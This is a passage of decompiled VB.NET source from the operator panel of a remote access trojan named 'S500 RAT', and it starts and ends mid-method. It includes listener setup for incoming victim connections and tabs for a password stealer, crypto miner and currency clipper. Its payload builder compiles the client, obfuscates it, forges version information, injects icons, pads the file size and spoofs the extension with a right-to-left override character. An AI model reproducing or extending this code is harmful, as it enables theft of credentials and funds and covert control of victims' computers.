								DataB.form1_0.L1.BeginInvoke(New MethodInvoker(Sub()
									MessageBox.Show(Me, ex.Message, "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
									Me.ButtCreateCertificate.Text = "OK"
									Me.ButtCreateCertificate.Enabled = True
									Me.NameCertificate.Enabled = True
									ListLogs.AddArray("Certificate : " + ex.Message, 0)
								End Sub))
							End Try
						End Sub)
					End If
				End If
			Catch ex As Exception
				Dim ex As Exception
				MessageBox.Show(Me, ex.Message, "Certificate2", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
				Me.ButtCreateCertificate.Text = "Ok"
				Me.ButtCreateCertificate.Enabled = True
				Me.NameCertificate.Enabled = True
				ListLogs.AddArray("Certificate : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000D3A RID: 3386 RVA: 0x00070F68 File Offset: 0x0006F168
		Private Sub NameCertificate_KeyPress(sender As Object, e As KeyPressEventArgs)
			e.Handled = ((e.KeyChar = "\"c OrElse Functions.CheckPathChard(e.KeyChar.ToString())) AndAlso Not Char.IsControl(e.KeyChar))
		End Sub

		' Token: 0x06000D3B RID: 3387 RVA: 0x00070FB0 File Offset: 0x0006F1B0
		Private Sub TextBox1_KeyPress(sender As Object, e As KeyPressEventArgs)
			Dim flag As Boolean = Not Char.IsNumber(e.KeyChar) And Not Char.IsControl(e.KeyChar)
			If flag Then
				e.Handled = True
			End If
		End Sub

		' Token: 0x06000D3C RID: 3388 RVA: 0x00070FEC File Offset: 0x0006F1EC
		Private Sub TextBox1_IconRightClick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Operators.CompareString(Me.TextBox1.Text, Nothing, False) = 0
				If flag Then
					MessageBox.Show("Please enter Port", "S500 RAT !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
				Else
					Me.PortsListBox.Items.Add(Me.TextBox1.Text)
					Me.TextBox1.Clear()
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D3D RID: 3389 RVA: 0x00071078 File Offset: 0x0006F278
		Private Sub TextBox1_IconLeftClick(sender As Object, e As EventArgs)
			Me.PortsListBox.Items.Remove(RuntimeHelpers.GetObjectValue(Me.PortsListBox.SelectedItem))
		End Sub

		' Token: 0x06000D3E RID: 3390 RVA: 0x0007109C File Offset: 0x0006F29C
		Private Async Sub StartPort_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.PortsListBox.Items.Count = 0
				If flag Then
					MessageBox.Show("Please Add The Port To List", "S500 RAT !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
				Else
					Await Task.Run(Sub()
						Dim flag2 As Boolean = Me.PortsListBox.Items.Count > 0
						If flag2 Then
							Me.StartPort.Enabled = False
							Me.StartPort.Text = "Please wait ..."
							Me.labelPorts.Text = "Connecting ..."
							Dim text As String = ""
							Try
								For Each value As Object In Me.PortsListBox.Items
									Dim str As String = Conversions.ToString(value)
									text = text + str + ","
								Next
							Finally
								Dim enumerator As IEnumerator
								If TypeOf enumerator Is IDisposable Then
									TryCast(enumerator, IDisposable).Dispose()
								End If
							End Try
							Functions.RegistrySetValue("#ListOpenPort", Conversions.ToString(text))
							Dim checked As Boolean = Me.SavePorts.Checked
							If checked Then
								Functions.RegistrySetValue("#SavePorts", Conversions.ToString(Conversions.ToBoolean(Me.SavePorts.Checked)))
							End If
							New Thread(Sub()
								Me.Connect()
							End Sub).Start()
						End If
					End Sub)
				End If
			Catch ex As Exception
				MessageBox.Show(ex.Message, "S500 RAT !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
				ListLogs.AddArray("S500 RAT! " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000D3F RID: 3391 RVA: 0x000710E4 File Offset: 0x0006F2E4
		Public Async Sub Connect()
			Try
				Await Task.Delay(1000)
				Try
					For Each obj As Object In Me.PortsListBox.Items
						Dim item As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(obj))
						If Not String.IsNullOrWhiteSpace(item) Then
							Dim Listener As Listener = New Listener()
							Dim ThreadListener As Thread = AddressOf Listener.Connect
							ThreadListener.Start(Convert.ToInt32(item.ToString().Trim()))
							Console.WriteLine("Listener : " + item)
						End If
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.ProgPortsBar.ProgressColor = Color.FromArgb(79, 46, 208)
				Me.StartPort.Text = "Started"
				Me.labelPorts.Text = "Connected"
				Me.ProgPortsBar.Image = Resources.Connected
				Me.NumPort.Text = "+" + Me.PortsListBox.Items.Count.ToString()
				Me.TextBox1.Enabled = False
				Me.Timer1.Start()
				Me.Timer2MAP.Start()
			Catch ex As Exception
				MessageBox.Show(ex.Message, "S500 RAT !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
				Environment.[Exit](0)
			End Try
		End Sub

		' Token: 0x06000D40 RID: 3392 RVA: 0x00071120 File Offset: 0x0006F320
		Private Sub FormS500_Load(sender As Object, e As EventArgs)
			Try
				Me.UserIdLogin.Text = FormLogin.auth_sample.user_data.id.ToString()
				Me.UsernameLogin.Text = FormLogin.auth_sample.user_data.username
				Me.ExpiryLogin.Text = FormLogin.auth_sample.user_data.expires
				Me.Level.Value = Conversions.ToSingle(FormLogin.auth_sample.user_data.level)
			Catch ex As Exception
			End Try
			Try
				Me.UiTabControl1.TabVisible = False
				Me.TabControlBuuilder.TabVisible = False
				Me.MinimumSize = MyBase.Size
				Me.ResizeBool = True
				Dim text As String = Conversions.ToString(Functions.RegistryGetValue("#ListOpenPort", ""))
				Try
					Dim flag As Boolean = text = Nothing
					If flag Then
						Me.PortsListBox.Items.AddRange(New Object() { "7505" })
					Else
						Try
							Dim array As String() = text.Split(New String() { "," }, StringSplitOptions.None)
							For Each text2 As String In array
								Dim flag2 As Boolean = Not String.IsNullOrWhiteSpace(text2)
								If flag2 Then
									Me.PortsListBox.Items.Add(text2.Trim())
								End If
							Next
						Catch ex2 As Exception
						End Try
					End If
					Me.Getsetting = False
				Catch ex3 As Exception
				End Try
				Me.CheckCertificate()
				Me.Bconnect.BackColor = Color.FromArgb(32, 40, 86)
				Me.Binstall.BackColor = Color.Transparent
				Me.BSecurity.BackColor = Color.Transparent
				Me.Bmining.BackColor = Color.Transparent
				Me.BClipper.BackColor = Color.Transparent
				Me.BAssembly.BackColor = Color.Transparent
				Me.build.BackColor = Color.Transparent
				Me.ReadBuilderData()
				Me.L1.ColumnHeadersDefaultCellStyle.BackColor = Color.FromArgb(79, 46, 208)
				Me.L1.DefaultCellStyle.BackColor = Color.FromArgb(19, 23, 61)
				Me.L1.DefaultCellStyle.SelectionBackColor = Color.FromArgb(47, 39, 134)
				Me.L1.DefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
				Me.L1.DefaultCellStyle.SelectionForeColor = Color.FromArgb(255, 255, 255)
				Me.L1.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(23, 27, 82)
				Me.L1.GridColor = Color.FromArgb(56, 37, 152)
				Me.L1.BorderStyle = BorderStyle.None
				Me.L1.CellBorderStyle = DataGridViewCellBorderStyle.[Single]
				Me.L1.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None
				Me.L1.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.[Single]
				DataB.form1_0 = Me
				MyBase.ShowInTaskbar = True
			Catch ex4 As Exception
				MyBase.Close()
			End Try
			Me.TapPortSettings.Selected = True
		End Sub

		' Token: 0x06000D41 RID: 3393 RVA: 0x000714E4 File Offset: 0x0006F6E4
		Private Function GetSelectedClients() As Clients()
			Dim CS$<>8__locals1 As FormS500._Closure$__2273-0 = New FormS500._Closure$__2273-0(CS$<>8__locals1)
			CS$<>8__locals1.$VB$Me = Me
			CS$<>8__locals1.$VB$Local_clientsList = New List(Of Clients)()
			MyBase.Invoke(New VB$AnonymousDelegate_0(Sub()
				Dim lockDataGridViewClients As Object = Setting.LockDataGridViewClients
				ObjectFlowControl.CheckForSyncLockOnValueType(lockDataGridViewClients)
				SyncLock lockDataGridViewClients
					Dim flag2 As Boolean = CS$<>8__locals1.$VB$Me.L1.SelectedRows.Count = 0
					If Not flag2 Then
						Try
							For Each obj As Object In CS$<>8__locals1.$VB$Me.L1.SelectedRows
								Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
								CS$<>8__locals1.$VB$Local_clientsList.Add(CType(dataGridViewRow.Tag, Clients))
							Next
						Finally
							Dim enumerator As IEnumerator
							If TypeOf enumerator Is IDisposable Then
								TryCast(enumerator, IDisposable).Dispose()
							End If
						End Try
					End If
				End SyncLock
			End Sub))
			Return CS$<>8__locals1.$VB$Local_clientsList.ToArray()
		End Function

		' Token: 0x06000D42 RID: 3394 RVA: 0x00071530 File Offset: 0x0006F730
		Private Sub TapHome_Click(sender As Object, e As EventArgs)
			Me.TapHome.Selected = True
			Me.TapClients.Selected = False
			Me.TapClientsMonitor.Selected = False
			Me.TapMining.Selected = False
			Me.TapClipper.Selected = False
			Me.TapPasswords.Selected = False
			Me.TapBuilder.Selected = False
			Me.TapPortSettings.Selected = False
			Me.TapAbout.Selected = False
			Me.TapHome.BackColor = Color.FromArgb(32, 40, 86)
			Me.TapClients.BackColor = Color.Transparent
			Me.TapClientsMonitor.BackColor = Color.Transparent
			Me.TapMining.BackColor = Color.Transparent
			Me.TapClipper.BackColor = Color.Transparent
			Me.TapPasswords.BackColor = Color.Transparent
			Me.TapBuilder.BackColor = Color.Transparent
			Me.TapPortSettings.BackColor = Color.Transparent
			Me.TapAbout.BackColor = Color.Transparent
			Me.UiTabControl1.SelectedIndex = 0
			Me.PathPage.Text = "Home"
			Me.NamePage1.Text = "Home"
		End Sub

		' Token: 0x06000D43 RID: 3395 RVA: 0x00071684 File Offset: 0x0006F884
		Private Sub TapClients_Click(sender As Object, e As EventArgs)
			Me.TapClients.Selected = True
			Me.TapHome.Selected = False
			Me.TapClientsMonitor.Selected = False
			Me.TapMining.Selected = False
			Me.TapClipper.Selected = False
			Me.TapPasswords.Selected = False
			Me.TapBuilder.Selected = False
			Me.TapPortSettings.Selected = False
			Me.TapAbout.Selected = False
			Me.TapClients.BackColor = Color.FromArgb(32, 40, 86)
			Me.TapHome.BackColor = Color.Transparent
			Me.TapClientsMonitor.BackColor = Color.Transparent
			Me.TapMining.BackColor = Color.Transparent
			Me.TapClipper.BackColor = Color.Transparent
			Me.TapPasswords.BackColor = Color.Transparent
			Me.TapBuilder.BackColor = Color.Transparent
			Me.TapPortSettings.BackColor = Color.Transparent
			Me.TapAbout.BackColor = Color.Transparent
			Me.UiTabControl1.SelectedIndex = 1
			Me.PathPage.Text = "Clients"
			Me.NamePage1.Text = "Clients"
		End Sub

		' Token: 0x06000D44 RID: 3396 RVA: 0x000717D8 File Offset: 0x0006F9D8
		Private Sub TapClientsMonitor_Click(sender As Object, e As EventArgs)
			Me.TapClientsMonitor.Selected = True
			Me.TapHome.Selected = False
			Me.TapClients.Selected = False
			Me.TapMining.Selected = False
			Me.TapClipper.Selected = False
			Me.TapPasswords.Selected = False
			Me.TapBuilder.Selected = False
			Me.TapPortSettings.Selected = False
			Me.TapAbout.Selected = False
			Me.TapClientsMonitor.BackColor = Color.FromArgb(32, 40, 86)
			Me.TapClients.BackColor = Color.Transparent
			Me.TapHome.BackColor = Color.Transparent
			Me.TapMining.BackColor = Color.Transparent
			Me.TapClipper.BackColor = Color.Transparent
			Me.TapPasswords.BackColor = Color.Transparent
			Me.TapBuilder.BackColor = Color.Transparent
			Me.TapPortSettings.BackColor = Color.Transparent
			Me.TapAbout.BackColor = Color.Transparent
			Me.UiTabControl1.SelectedIndex = 2
			Me.PathPage.Text = "Clients logs"
			Me.NamePage1.Text = "Clients logs"
		End Sub

		' Token: 0x06000D45 RID: 3397 RVA: 0x0007192C File Offset: 0x0006FB2C
		Private Sub TapMining_Click(sender As Object, e As EventArgs)
			Me.TapMining.Selected = True
			Me.TapHome.Selected = False
			Me.TapClients.Selected = False
			Me.TapClientsMonitor.Selected = False
			Me.TapClipper.Selected = False
			Me.TapPasswords.Selected = False
			Me.TapBuilder.Selected = False
			Me.TapPortSettings.Selected = False
			Me.TapAbout.Selected = False
			Me.TapMining.BackColor = Color.FromArgb(32, 40, 86)
			Me.TapClients.BackColor = Color.Transparent
			Me.TapHome.BackColor = Color.Transparent
			Me.TapClientsMonitor.BackColor = Color.Transparent
			Me.TapClipper.BackColor = Color.Transparent
			Me.TapPasswords.BackColor = Color.Transparent
			Me.TapBuilder.BackColor = Color.Transparent
			Me.TapPortSettings.BackColor = Color.Transparent
			Me.TapAbout.BackColor = Color.Transparent
			Me.UiTabControl1.SelectedIndex = 3
			Me.PathPage.Text = "Mining"
			Me.NamePage1.Text = "Mining"
		End Sub

		' Token: 0x06000D46 RID: 3398 RVA: 0x00071A80 File Offset: 0x0006FC80
		Private Sub TapClipper_Click(sender As Object, e As EventArgs)
			Me.TapClipper.Selected = True
			Me.TapHome.Selected = False
			Me.TapClients.Selected = False
			Me.TapClientsMonitor.Selected = False
			Me.TapMining.Selected = False
			Me.TapPasswords.Selected = False
			Me.TapBuilder.Selected = False
			Me.TapPortSettings.Selected = False
			Me.TapAbout.Selected = False
			Me.TapClipper.BackColor = Color.FromArgb(32, 40, 86)
			Me.TapClients.BackColor = Color.Transparent
			Me.TapHome.BackColor = Color.Transparent
			Me.TapClientsMonitor.BackColor = Color.Transparent
			Me.TapMining.BackColor = Color.Transparent
			Me.TapPasswords.BackColor = Color.Transparent
			Me.TapBuilder.BackColor = Color.Transparent
			Me.TapPortSettings.BackColor = Color.Transparent
			Me.TapAbout.BackColor = Color.Transparent
			Me.UiTabControl1.SelectedIndex = 4
			Me.PathPage.Text = "Currency Grabber"
			Me.NamePage1.Text = "Currency Grabber"
		End Sub

		' Token: 0x06000D47 RID: 3399 RVA: 0x00071BD4 File Offset: 0x0006FDD4
		Private Sub TapPasswords_Click(sender As Object, e As EventArgs)
			Me.TapPasswords.Selected = True
			Me.TapHome.Selected = False
			Me.TapClients.Selected = False
			Me.TapClientsMonitor.Selected = False
			Me.TapClipper.Selected = False
			Me.TapMining.Selected = False
			Me.TapBuilder.Selected = False
			Me.TapPortSettings.Selected = False
			Me.TapAbout.Selected = False
			Me.TapPasswords.BackColor = Color.FromArgb(32, 40, 86)
			Me.TapClients.BackColor = Color.Transparent
			Me.TapHome.BackColor = Color.Transparent
			Me.TapClientsMonitor.BackColor = Color.Transparent
			Me.TapClipper.BackColor = Color.Transparent
			Me.TapMining.BackColor = Color.Transparent
			Me.TapBuilder.BackColor = Color.Transparent
			Me.TapPortSettings.BackColor = Color.Transparent
			Me.TapAbout.BackColor = Color.Transparent
			Me.UiTabControl1.SelectedIndex = 5
			Me.PathPage.Text = "Passwords Stealer"
			Me.NamePage1.Text = "Passwords Stealer"
		End Sub

		' Token: 0x06000D48 RID: 3400 RVA: 0x00071D28 File Offset: 0x0006FF28
		Private Sub TapBuilder_Click(sender As Object, e As EventArgs)
			Me.TapBuilder.Selected = True
			Me.TapHome.Selected = False
			Me.TapClients.Selected = False
			Me.TapClientsMonitor.Selected = False
			Me.TapClipper.Selected = False
			Me.TapPasswords.Selected = False
			Me.TapMining.Selected = False
			Me.TapPortSettings.Selected = False
			Me.TapAbout.Selected = False
			Me.TapBuilder.BackColor = Color.FromArgb(32, 40, 86)
			Me.TapClients.BackColor = Color.Transparent
			Me.TapHome.BackColor = Color.Transparent
			Me.TapClientsMonitor.BackColor = Color.Transparent
			Me.TapClipper.BackColor = Color.Transparent
			Me.TapPasswords.BackColor = Color.Transparent
			Me.TapMining.BackColor = Color.Transparent
			Me.TapPortSettings.BackColor = Color.Transparent
			Me.TapAbout.BackColor = Color.Transparent
			Me.UiTabControl1.SelectedIndex = 6
			Me.PathPage.Text = "Builder"
			Me.NamePage1.Text = "Builder"
		End Sub

		' Token: 0x06000D49 RID: 3401 RVA: 0x00071E7C File Offset: 0x0007007C
		Private Sub TapTools_Click(sender As Object, e As EventArgs)
			Me.TapPortSettings.Selected = True
			Me.TapHome.Selected = False
			Me.TapClients.Selected = False
			Me.TapClientsMonitor.Selected = False
			Me.TapClipper.Selected = False
			Me.TapPasswords.Selected = False
			Me.TapBuilder.Selected = False
			Me.TapMining.Selected = False
			Me.TapAbout.Selected = False
			Me.TapPortSettings.BackColor = Color.FromArgb(32, 40, 86)
			Me.TapClients.BackColor = Color.Transparent
			Me.TapHome.BackColor = Color.Transparent
			Me.TapClientsMonitor.BackColor = Color.Transparent
			Me.TapClipper.BackColor = Color.Transparent
			Me.TapPasswords.BackColor = Color.Transparent
			Me.TapBuilder.BackColor = Color.Transparent
			Me.TapMining.BackColor = Color.Transparent
			Me.TapAbout.BackColor = Color.Transparent
			Me.UiTabControl1.SelectedIndex = 7
			Me.PathPage.Text = "Port Settings"
			Me.NamePage1.Text = "Port Settings"
		End Sub

		' Token: 0x06000D4A RID: 3402 RVA: 0x00071FD0 File Offset: 0x000701D0
		Private Sub TapAbout_Click(sender As Object, e As EventArgs)
			Me.TapAbout.Selected = True
			Me.TapHome.Selected = False
			Me.TapClients.Selected = False
			Me.TapClientsMonitor.Selected = False
			Me.TapClipper.Selected = False
			Me.TapPasswords.Selected = False
			Me.TapBuilder.Selected = False
			Me.TapMining.Selected = False
			Me.TapPortSettings.Selected = False
			Me.TapAbout.BackColor = Color.FromArgb(32, 40, 86)
			Me.TapClients.BackColor = Color.Transparent
			Me.TapHome.BackColor = Color.Transparent
			Me.TapClientsMonitor.BackColor = Color.Transparent
			Me.TapClipper.BackColor = Color.Transparent
			Me.TapPasswords.BackColor = Color.Transparent
			Me.TapBuilder.BackColor = Color.Transparent
			Me.TapPortSettings.BackColor = Color.Transparent
			Me.TapMining.BackColor = Color.Transparent
			Me.UiTabControl1.SelectedIndex = 9
			Me.PathPage.Text = "About"
			Me.NamePage1.Text = "About"
		End Sub

		' Token: 0x06000D4B RID: 3403 RVA: 0x00072124 File Offset: 0x00070324
		Private Sub Bconnect_Click_1(sender As Object, e As EventArgs)
			Try
				Me.Bconnect.BackColor = Color.FromArgb(32, 40, 86)
				Me.Binstall.BackColor = Color.Transparent
				Me.BSecurity.BackColor = Color.Transparent
				Me.Bmining.BackColor = Color.Transparent
				Me.BClipper.BackColor = Color.Transparent
				Me.BAssembly.BackColor = Color.Transparent
				Me.build.BackColor = Color.Transparent
				Me.TabControlBuuilder.SelectedIndex = 0
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D4C RID: 3404 RVA: 0x000721E0 File Offset: 0x000703E0
		Private Sub Binstall_Click(sender As Object, e As EventArgs)
			Try
				Me.Binstall.BackColor = Color.FromArgb(32, 40, 86)
				Me.Bconnect.BackColor = Color.Transparent
				Me.BSecurity.BackColor = Color.Transparent
				Me.Bmining.BackColor = Color.Transparent
				Me.BClipper.BackColor = Color.Transparent
				Me.BAssembly.BackColor = Color.Transparent
				Me.build.BackColor = Color.Transparent
				Me.TabControlBuuilder.SelectedIndex = 1
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D4D RID: 3405 RVA: 0x0007229C File Offset: 0x0007049C
		Private Sub BSecurity_Click(sender As Object, e As EventArgs)
			Try
				Me.BSecurity.BackColor = Color.FromArgb(32, 40, 86)
				Me.Binstall.BackColor = Color.Transparent
				Me.Bconnect.BackColor = Color.Transparent
				Me.Bmining.BackColor = Color.Transparent
				Me.BClipper.BackColor = Color.Transparent
				Me.BAssembly.BackColor = Color.Transparent
				Me.build.BackColor = Color.Transparent
				Me.TabControlBuuilder.SelectedIndex = 2
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D4E RID: 3406 RVA: 0x00072358 File Offset: 0x00070558
		Private Sub Bmining_Click(sender As Object, e As EventArgs)
			Try
				Me.Bmining.BackColor = Color.FromArgb(32, 40, 86)
				Me.Binstall.BackColor = Color.Transparent
				Me.BSecurity.BackColor = Color.Transparent
				Me.Bconnect.BackColor = Color.Transparent
				Me.BClipper.BackColor = Color.Transparent
				Me.BAssembly.BackColor = Color.Transparent
				Me.build.BackColor = Color.Transparent
				Me.TabControlBuuilder.SelectedIndex = 3
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D4F RID: 3407 RVA: 0x00072414 File Offset: 0x00070614
		Private Sub BClipper_Click(sender As Object, e As EventArgs)
			Try
				Me.BClipper.BackColor = Color.FromArgb(32, 40, 86)
				Me.Binstall.BackColor = Color.Transparent
				Me.BSecurity.BackColor = Color.Transparent
				Me.Bmining.BackColor = Color.Transparent
				Me.Bconnect.BackColor = Color.Transparent
				Me.BAssembly.BackColor = Color.Transparent
				Me.build.BackColor = Color.Transparent
				Me.TabControlBuuilder.SelectedIndex = 4
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D50 RID: 3408 RVA: 0x000724D0 File Offset: 0x000706D0
		Private Sub BAssembly_Click(sender As Object, e As EventArgs)
			Try
				Me.BAssembly.BackColor = Color.FromArgb(32, 40, 86)
				Me.Binstall.BackColor = Color.Transparent
				Me.BSecurity.BackColor = Color.Transparent
				Me.Bmining.BackColor = Color.Transparent
				Me.BClipper.BackColor = Color.Transparent
				Me.Bconnect.BackColor = Color.Transparent
				Me.build.BackColor = Color.Transparent
				Me.TabControlBuuilder.SelectedIndex = 5
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000D51 RID: 3409 RVA: 0x0007258C File Offset: 0x0007078C
		Private Sub FilesManagerToolStripMenuItem_Click_1(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000D52 RID: 3410 RVA: 0x00072590 File Offset: 0x00070790
		Private Async Sub Build_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Setting.Clienttext, Nothing, False) = 0
			If Not flag Then
				Try
					Me.build.Enabled = False
					Dim Stub As String = Functions.AES_DecryptText(Setting.Clienttext.ToString(), Conversions.ToString(RuntimeHelpers.GetObjectValue(FormSC.GetPassClient())))
					Stub = Me.SetConnection(Stub).ToString()
					Stub = Me.SetInstallation(Stub).ToString()
					Stub = Me.SetSecurity(Stub).ToString()
					Try
						Dim CS$<>8__locals1 As FormS500._Closure$__2290-0 = New FormS500._Closure$__2290-0(CS$<>8__locals1)
						CS$<>8__locals1.$VB$Me = Me
						CS$<>8__locals1.$VB$Local_FolderBuild = Application.StartupPath + "\Plugins"
						CS$<>8__locals1.$VB$Local_NameBuild = "\!.exe"
						Dim flag2 As Boolean = Not Directory.Exists(CS$<>8__locals1.$VB$Local_FolderBuild)
						If flag2 Then
							MessageBox.Show("Can't access build folder", "Builder!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
						Else
							CS$<>8__locals1.$VB$Local_dialog = New SaveFileDialog() With { .Filter = "EXE|*.exe", .FileName = "Client" }
							Dim flag3 As Boolean = CS$<>8__locals1.$VB$Local_dialog.ShowDialog() = DialogResult.OK
							If flag3 Then
								Dim referencedAssemblies As String() = New String() { "Microsoft.CSharp.dll", "System.dll", "System.Windows.Forms.dll", "Microsoft.VisualBasic.dll", "System.Management.dll", "System.Drawing.dll" }
								Dim providerOptions As Dictionary(Of String, String) = New Dictionary(Of String, String)() From { { "CompilerVersion", "v4.0" } }
								Dim compilerOptions As String = "/target:winexe /platform:anycpu /optimize+"
								Using cSharpCodeProvider As CSharpCodeProvider = New CSharpCodeProvider(providerOptions)
									Dim compilerParameters As CompilerParameters = FormS500.GetCompilerParameters(CS$<>8__locals1.$VB$Local_FolderBuild, CS$<>8__locals1.$VB$Local_NameBuild, referencedAssemblies, compilerOptions)
									Dim compilerResults As CompilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, New String() { Stub })
									Dim flag4 As Boolean = compilerResults.Errors.Count > 0
									If flag4 Then
										Try
											For Each obj As Object In compilerResults.Errors
												Dim compilerError As CompilerError = CType(obj, CompilerError)
												MessageBox.Show(String.Format("{0}" & vbLf & "Line: {1} - Column: {2}" & vbLf & "File: {3}", New Object() { compilerError.ErrorText, compilerError.Line, compilerError.Column, compilerError.FileName }))
											Next
										Finally
											Dim enumerator As IEnumerator
											If TypeOf enumerator Is IDisposable Then
												TryCast(enumerator, IDisposable).Dispose()
											End If
										End Try
										Me.build.Enabled = True
										Return
									End If
									Dim flag5 As Boolean = Not File.Exists(CS$<>8__locals1.$VB$Local_FolderBuild + CS$<>8__locals1.$VB$Local_NameBuild)
									If flag5 Then
										MessageBox.Show("Can't access build folder", "Builder!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
										Me.build.Enabled = True
										Return
									End If
									Await Task.Run(Sub()
										Dim moduleDefMD As ModuleDefMD = ModuleDefMD.Load(CS$<>8__locals1.$VB$Local_FolderBuild + CS$<>8__locals1.$VB$Local_NameBuild, Nothing)
										Renaming.DoRenaming(moduleDefMD, Conversions.ToString(Functions.ObfusctionRandom(CS$<>8__locals1.$VB$Me.ObfusctionComboBox.Text)))
										moduleDefMD.Write(CS$<>8__locals1.$VB$Local_dialog.FileName)
										moduleDefMD.Dispose()
										File.Delete(CS$<>8__locals1.$VB$Local_FolderBuild + CS$<>8__locals1.$VB$Local_NameBuild)
									End Sub)
									If Me.SaveBuilderInfo.Checked Then
										Me.SaveBuilderData()
									End If
									If Me.EnabledAssembly.Checked Then
										Try
											Me.WriteAssembly(CS$<>8__locals1.$VB$Local_dialog.FileName)
										Catch ex3 As Exception
										End Try
									End If
									If Me.Enabled_Icon.Checked Then
										Try
											If Me.Icon_Filename.Text IsNot Nothing AndAlso File.Exists(Me.Icon_Filename.Text) Then
												IconN.InjectIcon(CS$<>8__locals1.$VB$Local_dialog.FileName, Me.Icon_Filename.Text)
											End If
										Catch ex4 As Exception
										End Try
									End If
									If Me.Spoofing.Checked Then
										Try
											Dim ReverseCharacter As String = Conversions.ToString(Strings.ChrW(Conversions.ToInteger("&H202E")))
											Dim SpoofName As String = Path.GetFileNameWithoutExtension(CS$<>8__locals1.$VB$Local_dialog.FileName) + ReverseCharacter + Strings.StrReverse(Me.SpoofingText.Text) + ".exe"
											MyProject.Computer.FileSystem.RenameFile(CS$<>8__locals1.$VB$Local_dialog.FileName, SpoofName)
										Catch ex5 As Exception
										End Try
									End If
									If Me.EnabledSize.Checked Then
										Try
											Dim num As Double = Conversion.Val(Me.SizeValue.Value)
											If Me.KB.Checked Then
												num *= 1024.0
											End If
											If Me.MB.Checked Then
												num *= 1048576.0
												If Me.GB.Checked Then
													Return
												End If
												num *= 1097485676.0
											End If
											Dim fileStream As FileStream = File.OpenWrite(CS$<>8__locals1.$VB$Local_dialog.FileName)
											Dim num2 As Long = fileStream.Seek(0L, SeekOrigin.[End])
											While CDbl(num2) < num
												fileStream.WriteByte(0)
												num2 += 1L
											End While
											fileStream.Close()
										Catch ex6 As Exception
										End Try
									End If
									MessageBox.Show(CS$<>8__locals1.$VB$Local_dialog.FileName, "Complete", MessageBoxButtons.OK, MessageBoxIcon.Asterisk, MessageBoxDefaultButton.Button1)
									ListLogs.AddArray("Builder :  - " + CS$<>8__locals1.$VB$Local_dialog.FileName + " -  Created successfully", 3)
								End Using
							End If
							Me.build.Enabled = True
						End If
					Catch ex As Exception
						Me.build.Enabled = True
						MessageBox.Show(ex.Message, "Builder!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
						ListLogs.AddArray("Builder! : " + ex.Message, 0)
					End Try
				Catch ex2 As Exception
					Me.build.Enabled = True
					MessageBox.Show(ex2.Message, "Builder!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
					ListLogs.AddArray("Builder!  " + ex2.Message, 0)
				End Try
			End If
		End Sub

		' Token: 0x06000D53 RID: 3411 RVA: 0x000725D8 File Offset: 0x000707D8
		Private Shared Function GetCompilerParameters(FolderBuild As String, NameBuild As String, referencedAssemblies As String(), compilerOptions As String) As CompilerParameters
			Return New CompilerParameters(referencedAssemblies) With { .GenerateExecutable = True, .GenerateInMemory = False, .OutputAssembly = FolderBuild + NameBuild, .CompilerOptions = compilerOptions, .TreatWarningsAsErrors = False, .IncludeDebugInformation = False }
		End Function

		' Token: 0x06000D54 RID: 3412 RVA: 0x00072628 File Offset: 0x00070828
		Private Sub WriteAssembly(filename As String)
			Try
				Dim text As String = String.Concat(New String() { Me.Versions1.Value.ToString(), ".", Me.Versions2.Value.ToString(), ".", Me.Versions3.Value.ToString(), ".", Me.Versions4.Value.ToString() })
				Dim versionResource As VersionResource = New VersionResource()
				versionResource.LoadFrom(filename)
				versionResource.FileVersion = text
				versionResource.ProductVersion = text
				versionResource.Language = 0US
				Dim stringFileInfo As StringFileInfo = CType(versionResource("StringFileInfo"), StringFileInfo)
				stringFileInfo("ProductName") = Me.TitleAssembly.Text
				stringFileInfo("FileDescription") = Me.DescriptionsAssembly.Text
				stringFileInfo("CompanyName") = Me.CompanyAssembly.Text
				stringFileInfo("LegalCopyright") = Me.CopyrightAssembly.Text
				stringFileInfo("LegalTrademarks") = Me.TrademarksAssembly.Text
				stringFileInfo("Assembly Version") = versionResource.ProductVersion
				stringFileInfo("InternalName") = Me.TitleAssembly.Text
				stringFileInfo("OriginalFilename") = Me.TitleAssembly.Text
				stringFileInfo("ProductVersion") = versionResource.ProductVersion
				stringFileInfo("FileVersion") = versionResource.FileVersion
				versionResource.SaveTo(filename)
			Catch ex As Exception
				ListLogs.AddArray("Builder! Assembly: " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000D55 RID: 3413 RVA: 0x00072810 File Offset: 0x00070A10
